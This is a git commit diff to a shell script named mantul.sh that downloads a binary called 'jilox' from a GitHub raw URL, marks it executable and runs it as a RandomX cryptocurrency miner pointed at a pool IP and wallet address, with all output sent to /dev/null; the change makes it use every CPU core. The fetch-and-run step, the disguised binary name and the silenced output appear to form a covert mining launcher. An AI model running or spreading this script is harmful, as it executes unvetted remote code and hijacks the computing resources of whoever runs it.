4f729c9b6343d53d6af78e2b8e7a9050eee8cf7b
ganggamulyana08 <ganggamulyana08@gmail.com>
2024-08-01 17:21:15 +0700

    Update mantul.sh

--- mantul.sh
+++ mantul.sh
@@ -3,4 +3,4 @@ A=188.166.186.218:443
 B=8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB
 C=GAS
 wget https://github.com/14613261/14613261/raw/main/jilox && chmod u+x jilox >/dev/null 2>&1
-./jilox --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
+./jilox --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
